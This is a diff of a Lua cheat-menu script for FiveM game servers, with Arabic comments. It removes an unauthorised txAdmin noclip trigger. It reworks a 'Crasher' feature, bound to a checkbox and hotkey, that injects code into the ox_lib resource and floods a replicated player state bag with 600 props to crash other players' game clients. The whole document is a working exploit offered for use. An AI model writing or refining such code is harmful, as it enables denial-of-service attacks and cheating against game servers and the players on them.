@@ -5474,51 +5474,33 @@ MachoMenuButton(VIPTabSections[1], "Spawn", function()
     end
 end)
 
-MachoMenuCheckbox(VIPTabSections[1], "noclip", 
-    function()
-        TriggerEvent('txcl:setPlayerMode', "noclip", true)
-    end, 
-    function()
-        TriggerEvent('txcl:setPlayerMode', "none", true)
-    end
-)
+-- تعريف متغير الحالة
+local crasherEnabled = false
+local selectedKey = 0
 
-MachoMenuCheckbox(VIPTabSections[3], "Crasher1", function(enabled)
+-- 1. زر التفعيل (Checkbox)
+MachoMenuCheckbox(VIPTabSections[2], "Crasher", function(enabled)
+    crasherEnabled = enabled
     if enabled then
-        -- تنفيذ التريقر فور تفعيل الزر
-        MachoInjectResourceRaw("ox_lib", [[
-            CreateObject = function() end
-            local model <const> = 'p_spinning_anus_s'
-            local props <const> = {}
-
-            for i = 1, 600 do
-                props[i] = {
-                    model = model,
-                    coords = vec3(0.0, 0.0, 0.0),
-                    pos = vec3(0.0, 0.0, 0.0),
-                    rot = vec3(0.0, 0.0, 0.0)
-                }
-            end
-
-            local plyState <const> = LocalPlayer.state
-            plyState:set('lib:progressProps', props, true)
-            Wait(1000)
-            plyState:set('lib:progressProps', nil, true)
-        ]])
+        MachoMenuNotification("Crasher", "System Ready - Press Key")
+    else
+        MachoMenuNotification("Crasher", "System Disabled")
     end
 end)
 
--- Keybind للاختصار
-MachoMenuKeybind(VIPTabSections[3], "Crasher Key", 0, function(key, toggle)
+-- 2. تحديد الاختصار (Keybind)
+MachoMenuKeybind(VIPTabSections[2], "Crasher Key", 0, function(key, toggle)
     selectedKey = key
 end)
 
+-- 3. وظيفة الضغط على الزر والتنفيذ
 MachoOnKeyDown(function(key)
-    if key == selectedKey and selectedKey ~= 0 then
-        -- إرسال إشعار بالتنفيذ
-        MachoMenuNotification("Okay baby")
+    -- التحقق: هل الزر المكبوس هو المختار؟ وهل الـ Checkbox مفعل؟
+    if key == selectedKey and selectedKey ~= 0 and crasherEnabled then
+        
+        MachoMenuNotification("Crasher", "Okay baby")
 
-        -- تنفيذ التريقر مباشرة
+        -- تنفيذ التريقر
         MachoInjectResourceRaw("ox_lib", [[
             CreateObject = function() end
 
